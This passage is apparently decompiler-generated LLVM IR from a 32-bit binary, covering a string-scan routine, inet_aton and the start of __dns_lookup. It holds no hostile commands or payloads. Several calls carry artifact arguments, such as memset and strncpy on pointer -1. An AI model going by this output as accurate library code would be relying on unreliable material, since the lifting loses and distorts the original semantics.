  %v3_8052db426 = zext i8 %v2_8052db425 to i32
  %v5_8052db427 = and i32 %v0_8052d9d, -256
  %v6_8052db428 = or i32 %v3_8052db426, %v5_8052db427
  %v4_8052da2 = ptrtoint i8* %arg1 to i32
  %v1_8052dad13 = inttoptr i32 %arg2 to i8*
  %v4_8052dad.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8052dba

dec_label_pc_8052da8:                             ; preds = %dec_label_pc_8052dba, %dec_label_pc_8052dac
  %v6_8052dad23 = phi i32 [ %v6_8052dad, %dec_label_pc_8052dac ], [ %v6_8052dad17, %dec_label_pc_8052dba ]
  %v2_8052dad22 = phi i8 [ %v2_8052dad, %dec_label_pc_8052dac ], [ %v2_8052dad14, %dec_label_pc_8052dba ]
  %v0_8052dac21 = phi i32 [ %v1_8052dac, %dec_label_pc_8052dac ], [ %arg2, %dec_label_pc_8052dba ]
  %v15_8052da8 = icmp eq i8 %v2_8052dad22, %v2_8052db433
  br i1 %v15_8052da8, label %dec_label_pc_8052dc0, label %dec_label_pc_8052dac

dec_label_pc_8052dac:                             ; preds = %dec_label_pc_8052da8
  %v1_8052dac = add i32 %v0_8052dac21, 1
  store i32 %v1_8052dac, i32* @edx, align 4
  %v1_8052dad = inttoptr i32 %v1_8052dac to i8*
  %v2_8052dad = load i8, i8* %v1_8052dad, align 1
  %v3_8052dad = zext i8 %v2_8052dad to i32
  %v5_8052dad = and i32 %v6_8052dad23, -256
  %v6_8052dad = or i32 %v3_8052dad, %v5_8052dad
  store i32 %v6_8052dad, i32* @ecx, align 4
  %v4_8052daf = icmp eq i8 %v2_8052dad, 0
  %v1_8052db1 = icmp eq i1 %v4_8052daf, false
  br i1 %v1_8052db1, label %dec_label_pc_8052da8, label %dec_label_pc_8052db3

dec_label_pc_8052db3:                             ; preds = %dec_label_pc_8052dac, %dec_label_pc_8052dba
  %v4_8052dad.pre36 = phi i32 [ %v6_8052dad17, %dec_label_pc_8052dba ], [ %v6_8052dad, %dec_label_pc_8052dac ]
  %v1_8052db3 = add i32 %v0_8052db331, 1
  %v1_8052db4 = inttoptr i32 %v1_8052db3 to i8*
  %v2_8052db4 = load i8, i8* %v1_8052db4, align 1
  %v3_8052db4 = zext i8 %v2_8052db4 to i32
  %v5_8052db4 = and i32 %v6_8052db434, -256
  %v6_8052db4 = or i32 %v3_8052db4, %v5_8052db4
  %v4_8052db6 = icmp eq i8 %v2_8052db4, 0
  br i1 %v4_8052db6, label %dec_label_pc_8052dbe, label %dec_label_pc_8052dba

dec_label_pc_8052dba:                             ; preds = %dec_label_pc_8052dba.lr.ph, %dec_label_pc_8052db3
  %v4_8052dad.pre = phi i32 [ %v4_8052dad.pre.pre, %dec_label_pc_8052dba.lr.ph ], [ %v4_8052dad.pre36, %dec_label_pc_8052db3 ]
  %v6_8052db434 = phi i32 [ %v6_8052db428, %dec_label_pc_8052dba.lr.ph ], [ %v6_8052db4, %dec_label_pc_8052db3 ]
  %v2_8052db433 = phi i8 [ %v2_8052db425, %dec_label_pc_8052dba.lr.ph ], [ %v2_8052db4, %dec_label_pc_8052db3 ]
  %v0_8052db331 = phi i32 [ %v4_8052da2, %dec_label_pc_8052dba.lr.ph ], [ %v1_8052db3, %dec_label_pc_8052db3 ]
  store i32 %arg2, i32* @edx, align 4
  %v2_8052dad14 = load i8, i8* %v1_8052dad13, align 1
  %v3_8052dad15 = zext i8 %v2_8052dad14 to i32
  %v5_8052dad16 = and i32 %v4_8052dad.pre, -256
  %v6_8052dad17 = or i32 %v3_8052dad15, %v5_8052dad16
  store i32 %v6_8052dad17, i32* @ecx, align 4
  %v4_8052daf18 = icmp eq i8 %v2_8052dad14, 0
  %v1_8052db120 = icmp eq i1 %v4_8052daf18, false
  br i1 %v1_8052db120, label %dec_label_pc_8052da8, label %dec_label_pc_8052db3

dec_label_pc_8052dbe:                             ; preds = %dec_label_pc_8052db3, %entry
  br label %dec_label_pc_8052dc0

dec_label_pc_8052dc0:                             ; preds = %dec_label_pc_8052da8, %dec_label_pc_8052dbe
  %v0_8052dc2 = phi i32 [ 0, %dec_label_pc_8052dbe ], [ %v0_8052db331, %dec_label_pc_8052da8 ]
  store i32 %v0_8052d9d, i32* @ebx, align 4
  ret i32 %v0_8052dc2

; uselistorder directives
  uselistorder i32 %v6_8052dad17, { 2, 0, 1 }
  uselistorder i8 %v2_8052dad14, { 1, 2, 0 }
  uselistorder i32 %v1_8052db3, { 1, 0 }
  uselistorder i32 %v6_8052dad, { 1, 2, 0 }
  uselistorder i8 %v2_8052dad, { 1, 2, 0 }
  uselistorder i32 %v1_8052dac, { 2, 1, 0 }
  uselistorder i8 %v2_8052db425, { 0, 2, 1 }
  uselistorder i32 %v0_8052d9d, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052dc0, { 1, 0 }
  uselistorder label %dec_label_pc_8052dba, { 1, 0 }
  uselistorder label %dec_label_pc_8052db3, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v4_8052dcb = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052dcb, i32* @ecx, align 4
  %v1_8052dcf = icmp eq i8* %arg1, null
  br i1 %v1_8052dcf, label %dec_label_pc_8052e50, label %dec_label_pc_8052dd3

dec_label_pc_8052dd3:                             ; preds = %entry
  %v0_8052dde.pre = load i32, i32* @global_var_8059dd8, align 8
  br label %dec_label_pc_8052dde

dec_label_pc_8052dde:                             ; preds = %dec_label_pc_8052dd3, %dec_label_pc_8052e27
  %v2_8052e2734 = phi i32 [ 1, %dec_label_pc_8052dd3 ], [ %v3_8052e27, %dec_label_pc_8052e27 ]
  %v0_8052de433 = phi i32 [ %v4_8052dcb, %dec_label_pc_8052dd3 ], [ %v0_8052de43, %dec_label_pc_8052e27 ]
  %v0_8052e4532 = phi i32 [ 0, %dec_label_pc_8052dd3 ], [ %v2_8052e2d, %dec_label_pc_8052e27 ]
  %v1_8052de4 = inttoptr i32 %v0_8052de433 to i8*
  %v2_8052de4 = load i8, i8* %v1_8052de4, align 1
  %v3_8052de4 = sext i8 %v2_8052de4 to i32
  %v2_8052de7 = mul nsw i32 %v3_8052de4, 2
  %v3_8052de7 = add i32 %v2_8052de7, %v0_8052dde.pre
  %v4_8052de7 = inttoptr i32 %v3_8052de7 to i8*
  %v5_8052de7 = load i8, i8* %v4_8052de7, align 1
  %v6_8052de7 = and i8 %v5_8052de7, 8
  %v7_8052de7 = icmp eq i8 %v6_8052de7, 0
  br i1 %v7_8052de7, label %dec_label_pc_8052e50, label %dec_label_pc_8052dee

dec_label_pc_8052dee:                             ; preds = %dec_label_pc_8052dde
  %v4_8052e02.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052e02

dec_label_pc_8052df2:                             ; preds = %dec_label_pc_8052e02
  %v3_8052df2 = mul i32 %v1_8052df2, 10
  %v2_8052df5 = add i32 %v3_8052df2, -48
  %v3_8052df5 = add i32 %v2_8052df5, %v2_8052e04
  %v1_8052df9 = add i32 %v3_8052df5, -255
  %v6_8052df9 = sub i32 254, %v3_8052df5
  %v7_8052df9 = and i32 %v6_8052df9, %v3_8052df5
  %v8_8052df9 = icmp slt i32 %v7_8052df9, 0
  %v9_8052df9 = icmp eq i32 %v1_8052df9, 0
  %v10_8052df9 = icmp slt i32 %v1_8052df9, 0
  %v3_8052dff = icmp eq i1 %v10_8052df9, %v8_8052df9
  %v4_8052dff = icmp eq i1 %v9_8052df9, false
  %v5_8052dff = and i1 %v4_8052dff, %v3_8052dff
  br i1 %v5_8052dff, label %dec_label_pc_8052e50, label %dec_label_pc_8052e01

dec_label_pc_8052e01:                             ; preds = %dec_label_pc_8052df2
  %v1_8052e01 = add i32 %v0_8052e01, 1
  store i32 %v1_8052e01, i32* @ecx, align 4
  br label %dec_label_pc_8052e02

dec_label_pc_8052e02:                             ; preds = %dec_label_pc_8052dee, %dec_label_pc_8052e01
  %v1_8052df2 = phi i32 [ 0, %dec_label_pc_8052dee ], [ %v3_8052df5, %dec_label_pc_8052e01 ]
  %v4_8052e02 = phi i32 [ %v4_8052e02.pre, %dec_label_pc_8052dee ], [ %v6_8052e02, %dec_label_pc_8052e01 ]
  %v0_8052e01 = phi i32 [ %v0_8052de433, %dec_label_pc_8052dee ], [ %v1_8052e01, %dec_label_pc_8052e01 ]
  %v1_8052e02 = inttoptr i32 %v0_8052e01 to i8*
  %v2_8052e02 = load i8, i8* %v1_8052e02, align 1
  %v3_8052e02 = zext i8 %v2_8052e02 to i32
  %v5_8052e02 = and i32 %v4_8052e02, -256
  %v6_8052e02 = or i32 %v3_8052e02, %v5_8052e02
  store i32 %v6_8052e02, i32* @edx, align 4
  %v2_8052e04 = sext i8 %v2_8052e02 to i32
  %v2_8052e07 = mul nsw i32 %v2_8052e04, 2
  %v3_8052e07 = add i32 %v2_8052e07, %v0_8052dde.pre
  %v4_8052e07 = inttoptr i32 %v3_8052e07 to i16*
  %v5_8052e07 = load i16, i16* %v4_8052e07, align 2
  %v2_8052e0c = and i16 %v5_8052e07, 8
  %v3_8052e0c = icmp eq i16 %v2_8052e0c, 0
  %v1_8052e0e = icmp eq i1 %v3_8052e0c, false
  br i1 %v1_8052e0e, label %dec_label_pc_8052df2, label %dec_label_pc_8052e10

dec_label_pc_8052e10:                             ; preds = %dec_label_pc_8052e02
  %v8_8052e10 = sub nsw i32 2, %v2_8052e2734
  %v9_8052e10 = and i32 %v8_8052e10, %v2_8052e2734
  %v10_8052e10 = icmp slt i32 %v9_8052e10, 0
  %v11_8052e10 = icmp eq i32 %v2_8052e2734, 3
  %v12_8052e10 = icmp slt i32 %v2_8052e2734, 3
  %v3_8052e14 = icmp eq i1 %v12_8052e10, %v10_8052e10
  %v4_8052e14 = icmp eq i1 %v11_8052e10, false
  %v5_8052e14 = and i1 %v4_8052e14, %v3_8052e14
  br i1 %v5_8052e14, label %dec_label_pc_8052e1e, label %dec_label_pc_8052e16

dec_label_pc_8052e16:                             ; preds = %dec_label_pc_8052e10
  %v10_8052e16 = icmp eq i8 %v2_8052e02, 46
  %v1_8052e19 = icmp eq i1 %v10_8052e16, false
  br i1 %v1_8052e19, label %dec_label_pc_8052e50, label %dec_label_pc_8052e1b

dec_label_pc_8052e1b:                             ; preds = %dec_label_pc_8052e16
  %v1_8052e1b = add i32 %v0_8052e01, 1
  store i32 %v1_8052e1b, i32* @ecx, align 4
  br label %dec_label_pc_8052e27

dec_label_pc_8052e1e:                             ; preds = %dec_label_pc_8052e10
  %v1_8052e1e = add i32 %v0_8052e01, 1
  store i32 %v1_8052e1e, i32* @ecx, align 4
  %v4_8052e1f = icmp eq i8 %v2_8052e02, 0
  br i1 %v4_8052e1f, label %dec_label_pc_8052e27, label %dec_label_pc_8052e23

dec_label_pc_8052e23:                             ; preds = %dec_label_pc_8052e1e
  %v2_8052e23 = and i16 %v5_8052e07, 32
  %v3_8052e23 = icmp eq i16 %v2_8052e23, 0
  br i1 %v3_8052e23, label %dec_label_pc_8052e50, label %dec_label_pc_8052e27

dec_label_pc_8052e27:                             ; preds = %dec_label_pc_8052e23, %dec_label_pc_8052e1e, %dec_label_pc_8052e1b
  %v0_8052de43 = phi i32 [ %v1_8052e1e, %dec_label_pc_8052e23 ], [ %v1_8052e1e, %dec_label_pc_8052e1e ], [ %v1_8052e1b, %dec_label_pc_8052e1b ]
  %v3_8052e27 = add nuw nsw i32 %v2_8052e2734, 1
  %v2_8052e2a = mul i32 %v0_8052e4532, 256
  %v2_8052e2d = or i32 %v1_8052df2, %v2_8052e2a
  %v7_8052e33 = icmp sgt i32 %v2_8052e2734, 3
  br i1 %v7_8052e33, label %dec_label_pc_8052e35, label %dec_label_pc_8052dde

dec_label_pc_8052e35:                             ; preds = %dec_label_pc_8052e27
  %v4_8052e35 = icmp eq i32 %arg2, 0
  br i1 %v4_8052e35, label %dec_label_pc_8052e52, label %dec_label_pc_8052e41

dec_label_pc_8052e41:                             ; preds = %dec_label_pc_8052e35
  %v1_8052e45 = call i32 @llvm.bswap.i32(i32 %v2_8052e2d)
  %v2_8052e47 = inttoptr i32 %arg2 to i32*
  store i32 %v1_8052e45, i32* %v2_8052e47, align 4
  br label %dec_label_pc_8052e52

dec_label_pc_8052e50:                             ; preds = %dec_label_pc_8052e23, %dec_label_pc_8052e16, %dec_label_pc_8052dde, %dec_label_pc_8052df2, %entry
  br label %dec_label_pc_8052e52

dec_label_pc_8052e52:                             ; preds = %dec_label_pc_8052e35, %dec_label_pc_8052e41, %dec_label_pc_8052e50
  %v0_8052e57 = phi i32 [ 1, %dec_label_pc_8052e35 ], [ 1, %dec_label_pc_8052e41 ], [ 0, %dec_label_pc_8052e50 ]
  ret i32 %v0_8052e57

; uselistorder directives
  uselistorder i32 %v2_8052e04, { 1, 0 }
  uselistorder i32 %v6_8052e02, { 1, 0 }
  uselistorder i8 %v2_8052e02, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8052e01, { 0, 1, 3, 2 }
  uselistorder i32 %v1_8052df9, { 1, 0 }
  uselistorder i32 %v3_8052df5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_8052de433, { 1, 0 }
  uselistorder i32 %v2_8052e2734, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8052e52, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052e50, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_8052e02, { 1, 0 }
  uselistorder label %dec_label_pc_8052dde, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i8*, align 4
  store i32 %arg3, i32* @edi, align 4
  store i8* inttoptr (i32 512 to i8*), i8** %stack_var_-252, align 4
  %v2_8052e6e = call i32 @malloc(i32 512)
  store i32 %v2_8052e6e, i32* %eax.global-to-local, align 4
  store i8* inttoptr (i32 1025 to i8*), i8** %stack_var_-252, align 4
  store i32 %v2_8052e6e, i32* @ebp, align 4
  %v2_8052e7c = call i32 @malloc(i32 1025)
  store i32 %v2_8052e7c, i32* %eax.global-to-local, align 4
  %v12_8052e85 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8052e88 = icmp eq i32 %v2_8052e6e, 0
  br i1 %v1_8052e88, label %dec_label_pc_8053501, label %dec_label_pc_8052e90

dec_label_pc_8052e90:                             ; preds = %entry
  %v1_8052e90 = icmp eq i32 %v2_8052e7c, 0
  br i1 %v1_8052e90, label %dec_label_pc_8053501, label %dec_label_pc_8052e98

dec_label_pc_8052e98:                             ; preds = %dec_label_pc_8052e90
  %v5_8052e98 = icmp eq i32 %arg2, 0
  br i1 %v5_8052e98, label %dec_label_pc_8053501, label %dec_label_pc_8052ea6

dec_label_pc_8052ea6:                             ; preds = %dec_label_pc_8052e98
  %v4_8052ea6 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8052ea6, i32* %eax.global-to-local, align 4
  %v2_8052ead = load i8, i8* %arg1, align 1
  %v3_8052ead = icmp eq i8 %v2_8052ead, 0
  br i1 %v3_8052ead, label %dec_label_pc_8053501, label %dec_label_pc_8052eb6

dec_label_pc_8052eb6:                             ; preds = %dec_label_pc_8052ea6
  store i8* %arg1, i8** %stack_var_-252, align 4
  %v3_8052eba = call i32 @strlen(i8* nonnull %arg1)
  store i32 %v3_8052eba, i32* @eax, align 4
  store i32 %v4_8052ea6, i32* %edx.global-to-local, align 4
  %v2_8052edd = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_8052edd, i32* @ebx, align 4
  %tmp46 = bitcast i32* %stack_var_-52 to i8*
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052ee5 = call i32 @__pthread_return_void(i32 %v2_8052edd, i32 134552351)
  store i32 %v3_8052ee5, i32* %eax.global-to-local, align 4
  store i8* bitcast (i8** @global_var_80602e8.241 to i8*), i8** %stack_var_-252, align 4
  %v2_8052ef1 = call i32 @__pthread_return_0(i32 ptrtoint (i8** @global_var_80602e8.241 to i32))
  %v0_8052ef6 = load i64, i64* @global_var_8060300.242, align 8
  %v1_8052ef6 = trunc i64 %v0_8052ef6 to i32
  %v1_8052efb = ashr i32 %v1_8052ef6, 31
  %v6_8052efc = and i64 %v0_8052ef6, 4294967295
  %v8_8052efc = zext i32 %v1_8052efb to i64
  %v9_8052efc = mul nuw i64 %v8_8052efc, 4294967296
  %v10_8052efc = or i64 %v9_8052efc, %v6_8052efc
  %v14_8052efc = srem i64 %v10_8052efc, %tmp33
  %v15_8052efc = trunc i64 %v14_8052efc to i32
  %v0_8052f03 = load i16, i16* @global_var_805a044.243, align 4
  %v2_8052f12 = load i8*, i8** %stack_var_-252, align 4
  %v3_8052f12 = ptrtoint i8* %v2_8052f12 to i32
  store i32 %v3_8052f12, i32* @eax, align 4
  store i32 134552351, i32* %edx.global-to-local, align 4
  store i8* %tmp46, i8** %stack_var_-252, align 4
  %v3_8052f17 = call i32 @__pthread_return_void(i32 %v2_8052edd, i32 1)
  store i32 %v3_8052f17, i32* %eax.global-to-local, align 4
  %v4_80530be = inttoptr i32 %v15_8052efc to i8*
  %v1_80534dc72 = add i32 %v12_8052e85, 28
  %v2_80534dc73 = inttoptr i32 %v1_80534dc72 to i32*
  %v3_80534dc74 = load i32, i32* %v2_80534dc73, align 4
  %tmp = icmp ult i32 %v3_80534dc74, 3
  br i1 %tmp, label %dec_label_pc_8052f3c, label %dec_label_pc_8053501

dec_label_pc_8052f3c:                             ; preds = %dec_label_pc_8052eb6, %dec_label_pc_80534dc.backedge
  %v0_8052f4383 = phi i32 [ %v0_80534dc.pre, %dec_label_pc_80534dc.backedge ], [ %v12_8052e85, %dec_label_pc_8052eb6 ]
  %v1_8052f3c = add i32 %v0_8052f4383, 20
  %v2_8052f3c = inttoptr i32 %v1_8052f3c to i32*
  %v3_8052f3c = load i32, i32* %v2_8052f3c, align 4
  %v13_8052f3c = icmp eq i32 %v3_8052f3c, -1
  br i1 %v13_8052f3c, label %dec_label_pc_8052f3c.dec_label_pc_8052f52_crit_edge, label %dec_label_pc_8052f43

dec_label_pc_8052f3c.dec_label_pc_8052f52_crit_edge: ; preds = %dec_label_pc_8052f3c
  %v0_8052f52.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8052f52

dec_label_pc_8052f43:                             ; preds = %dec_label_pc_8052f3c
  %v3_8052f46 = load i32, i32* %v2_8052f3c, align 4
  %v5_8052f46 = add i32 %v0_8052f4383, -16
  %v6_8052f46 = inttoptr i32 %v5_8052f46 to i32*
  store i32 %v3_8052f46, i32* %v6_8052f46, align 4
  %v1_8052f4a = call i32 @__libc_close(i32 -1)
  store i32 %v1_8052f4a, i32* %eax.global-to-local, align 4
  %v0_8052f4f = load i32, i32* @esp, align 4
  %v1_8052f4f = add i32 %v0_8052f4f, 16
  br label %dec_label_pc_8052f52

dec_label_pc_8052f52:                             ; preds = %dec_label_pc_8052f3c.dec_label_pc_8052f52_crit_edge, %dec_label_pc_8052f43
  %v1_8052f52 = phi i32 [ %v0_8052f4383, %dec_label_pc_8052f3c.dec_label_pc_8052f52_crit_edge ], [ %v1_8052f4f, %dec_label_pc_8052f43 ]
  %v0_8052f52 = phi i32 [ %v0_8052f52.pre, %dec_label_pc_8052f3c.dec_label_pc_8052f52_crit_edge ], [ %v1_8052f4a, %dec_label_pc_8052f43 ]
  %v2_8052f52 = add i32 %v1_8052f52, -4
  %v3_8052f52 = inttoptr i32 %v2_8052f52 to i32*
  store i32 %v0_8052f52, i32* %v3_8052f52, align 4
  %v1_8052f53 = add i32 %v1_8052f52, -8
  %v2_8052f53 = inttoptr i32 %v1_8052f53 to i32*
  store i32 512, i32* %v2_8052f53, align 4
  %v1_8052f58 = add i32 %v1_8052f52, -12
  %v2_8052f58 = inttoptr i32 %v1_8052f58 to i32*
  store i32 0, i32* %v2_8052f58, align 4
  %v2_8052f5a = add i32 %v1_8052f52, -16
  %v3_8052f5a = inttoptr i32 %v2_8052f5a to i32*
  store i32 %v2_8052e6e, i32* %v3_8052f5a, align 4
  %v4_8052f5b = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052f5b, i32* %eax.global-to-local, align 4
  %v0_8052f60 = load i32, i32* @esp, align 4
  %v1_8052f63 = add i32 %v0_8052f60, 8
  %v2_8052f63 = inttoptr i32 %v1_8052f63 to i32*
  store i32 48, i32* %v2_8052f63, align 4
  %v1_8052f65 = add i32 %v0_8052f60, 4
  %v2_8052f65 = inttoptr i32 %v1_8052f65 to i32*
  store i32 0, i32* %v2_8052f65, align 4
  %v1_8052f67 = add i32 %v0_8052f60, 84
  store i32 %v1_8052f67, i32* @ebx, align 4
  %v3_8052f6b = inttoptr i32 %v0_8052f60 to i32*
  store i32 %v1_8052f67, i32* %v3_8052f6b, align 4
  %v4_8052f6c = call i32 @__GI_memset(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052f6c, i32* %eax.global-to-local, align 4
  %v0_8052f71 = load i32, i32* @esp, align 4
  %v1_8052f71 = add i32 %v0_8052f71, 72
  %v2_8052f71 = inttoptr i32 %v1_8052f71 to i32*
  %v3_8052f71 = load i32, i32* %v2_8052f71, align 4
  store i32 %v3_8052f71, i32* %eax.global-to-local, align 4
  %v1_8052f75 = add i32 %v0_8052f71, 116
  %v2_8052f75 = inttoptr i32 %v1_8052f75 to i32*
  store i32 1, i32* %v2_8052f75, align 4
  %v0_8052f7d = load i32, i32* @esp, align 4
  %v1_8052f7d = add i32 %v0_8052f7d, 104
  %v2_8052f7d = inttoptr i32 %v1_8052f7d to i32*
  store i32 1, i32* %v2_8052f7d, align 4
  %v0_8052f85 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f85 = add i32 %v0_8052f85, 1
  %v1_8052f86 = urem i32 %v1_8052f85, 65536
  store i32 %v1_8052f86, i32* %eax.global-to-local, align 4
  %v1_8052f8b = load i32, i32* @esp, align 4
  %v2_8052f8b = add i32 %v1_8052f8b, 72
  %v3_8052f8b = inttoptr i32 %v2_8052f8b to i32*
  store i32 %v1_8052f86, i32* %v3_8052f8b, align 4
  %v0_8052f8f = load i32, i32* %eax.global-to-local, align 4
  %v1_8052f8f = load i32, i32* @esp, align 4
  %v2_8052f8f = add i32 %v1_8052f8f, 84
  %v3_8052f8f = inttoptr i32 %v2_8052f8f to i32*
  store i32 %v0_8052f8f, i32* %v3_8052f8f, align 4
  %v0_8052f93 = load i32, i32* @esp, align 4
  %v1_8052f96 = add i32 %v0_8052f93, 8
  %v2_8052f96 = inttoptr i32 %v1_8052f96 to i32*
  store i32 512, i32* %v2_8052f96, align 4
  %v2_8052f9b = add i32 %v0_8052f93, 4
  %v3_8052f9b = inttoptr i32 %v2_8052f9b to i32*
  store i32 %v2_8052e6e, i32* %v3_8052f9b, align 4
  %v0_8052f9c = load i32, i32* @ebx, align 4
  %v3_8052f9c = inttoptr i32 %v0_8052f93 to i32*
  store i32 %v0_8052f9c, i32* %v3_8052f9c, align 4
  %v0_8052f9d = call i32 @__encode_header()
  store i32 %v0_8052f9d, i32* %eax.global-to-local, align 4
  %v0_8052fa2 = load i32, i32* @esp, align 4
  %v2_8052fa5 = icmp slt i32 %v0_8052f9d, 0
  store i32 %v0_8052f9d, i32* @ebx, align 4
  br i1 %v2_8052fa5, label %dec_label_pc_8053501, label %dec_label_pc_8052faf

dec_label_pc_8052faf:                             ; preds = %dec_label_pc_8052f52
  %v2_8052faf = add i32 %v0_8052fa2, 12
  %v3_8052faf = inttoptr i32 %v2_8052faf to i32*
  store i32 %v0_8052f9d, i32* %v3_8052faf, align 4
  %v1_8052fb0 = add i32 %v0_8052fa2, 8
  %v2_8052fb0 = inttoptr i32 %v1_8052fb0 to i32*
  store i32 1025, i32* %v2_8052fb0, align 4
  %v1_8052fb5 = add i32 %v0_8052fa2, 256
  %v2_8052fb5 = inttoptr i32 %v1_8052fb5 to i32*
  %v3_8052fb5 = load i32, i32* %v2_8052fb5, align 4
  %v5_8052fb5 = add i32 %v0_8052fa2, 4
  %v6_8052fb5 = inttoptr i32 %v5_8052fb5 to i32*
  store i32 %v3_8052fb5, i32* %v6_8052fb5, align 4
  %v1_8052fbc = add i32 %v0_8052fa2, 28
  %v2_8052fbc = inttoptr i32 %v1_8052fbc to i32*
  %v3_8052fbc = load i32, i32* %v2_8052fbc, align 4
  %v6_8052fbc = inttoptr i32 %v0_8052fa2 to i32*
  store i32 %v3_8052fbc, i32* %v6_8052fbc, align 4
  %v4_8052fc0 = call i32 @strncpy(i8* inttoptr (i32 -1 to i8*), i32 %v15_8052efc, i32 ptrtoint (i32* @0 to i32))
  %v0_8052fc5 = load i32, i32* @esp, align 4
  %v1_8052fc8 = add i32 %v0_8052fc5, 8
  %v2_8052fc8 = inttoptr i32 %v1_8052fc8 to i32*
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* %v2_8052fc8, align 4
  %v1_8052fcd = add i32 %v0_8052fc5, 4
  %v2_8052fcd = inttoptr i32 %v1_8052fcd to i32*
  store i32 134552351, i32* %v2_8052fcd, align 4
  %v1_8052fd2 = add i32 %v0_8052fc5, 200
  store i32 %v1_8052fd2, i32* @eax, align 4
  %v3_8052fd9 = inttoptr i32 %v0_8052fc5 to i32*
  store i32 %v1_8052fd2, i32* %v3_8052fd9, align 4
  %v2_8052fda = call i32 @__pthread_return_void(i32 -1, i32 %v15_8052efc)
  store i32 %v2_8052fda, i32* %eax.global-to-local, align 4
  %v0_8052fdf = load i32, i32* @esp, align 4
  %v1_8052fdf = inttoptr i32 %v0_8052fdf to i32*
  store i32 ptrtoint (i32* @global_var_805a048.183 to i32), i32* %v1_8052fdf, align 4
  %v1_8052fe6 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8052fe6, i32* %eax.global-to-local, align 4
  %v0_8052feb = load i32, i32* @esp, align 4
  %v1_8052feb = add i32 %v0_8052feb, 56
  %v2_8052feb = inttoptr i32 %v1_8052feb to i32*
  %v3_8052feb = load i32, i32* %v2_8052feb, align 4
  store i32 %v3_8052feb, i32* %edx.global-to-local, align 4
  %v1_8052fef = add i32 %v0_8052feb, 268
  %v2_8052fef = inttoptr i32 %v1_8052fef to i32*
  %v3_8052fef = load i32, i32* %v2_8052fef, align 4
  store i32 %v3_8052fef, i32* %eax.global-to-local, align 4
  %v2_8052ff6 = mul i32 %v3_8052feb, 4
  %v3_8052ff6 = add i32 %v3_8052fef, %v2_8052ff6
  %v4_8052ff6 = inttoptr i32 %v3_8052ff6 to i32*
  %v5_8052ff6 = load i32, i32* %v4_8052ff6, align 4
  store i32 %v5_8052ff6, i32* %edx.global-to-local, align 4
  %v2_8052ff9 = add i32 %v0_8052feb, 48
  %v3_8052ff9 = inttoptr i32 %v2_8052ff9 to i32*
  store i32 %v5_8052ff6, i32* %v3_8052ff9, align 4
  %v0_8052ffd = load i32, i32* @esp, align 4
  %v1_8052ffd = add i32 %v0_8052ffd, 16
  %v1_8053000 = add i32 %v0_8052ffd, 52
  %v2_8053000 = inttoptr i32 %v1_8053000 to i32*
  %v3_8053000 = load i32, i32* %v2_8053000, align 4
  %v5_8053000 = icmp slt i32 %v3_8053000, 0
  br i1 %v5_8053000, label %dec_label_pc_8052faf.dec_label_pc_8053046_crit_edge, label %dec_label_pc_8053007

dec_label_pc_8052faf.dec_label_pc_8053046_crit_edge: ; preds = %dec_label_pc_8052faf
  %v0_8053046.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053046

dec_label_pc_8053007:                             ; preds = %dec_label_pc_8052faf
  store i32 %v3_8053000, i32* %eax.global-to-local, align 4
  %v1_805300b = load i32, i32* @global_var_8060738.244, align 8
  %v2_805300b = sub i32 %v3_8053000, %v1_805300b
  %v8_805300b = xor i32 %v1_805300b, %v3_8053000
  %v9_805300b = xor i32 %v2_805300b, %v3_8053000
  %v10_805300b = and i32 %v9_805300b, %v8_805300b
  %v11_805300b = icmp slt i32 %v10_805300b, 0
  %v13_805300b = icmp slt i32 %v2_805300b, 0
  %v2_8053011 = icmp eq i1 %v13_805300b, %v11_805300b
  br i1 %v2_8053011, label %dec_label_pc_8053046, label %dec_label_pc_8053013

dec_label_pc_8053013:                             ; preds = %dec_label_pc_8053007
  %v2_8053013 = add i32 %v0_8052ffd, 12
  %v3_8053013 = inttoptr i32 %v2_8053013 to i32*
  store i32 %v3_8053000, i32* %v3_8053013, align 4
  %v1_8053014 = add i32 %v0_8052ffd, 8
  %v2_8053014 = inttoptr i32 %v1_8053014 to i32*
  store i32 1025, i32* %v2_8053014, align 4
  %v1_8053019 = add i32 %v0_8052ffd, 4
  %v2_8053019 = inttoptr i32 %v1_8053019 to i32*
  store i32 ptrtoint (i32* @global_var_805861c.245 to i32), i32* %v2_8053019, align 4
  %v1_805301e = add i32 %v0_8052ffd, 28
  %v2_805301e = inttoptr i32 %v1_805301e to i32*
  %v3_805301e = load i32, i32* %v2_805301e, align 4
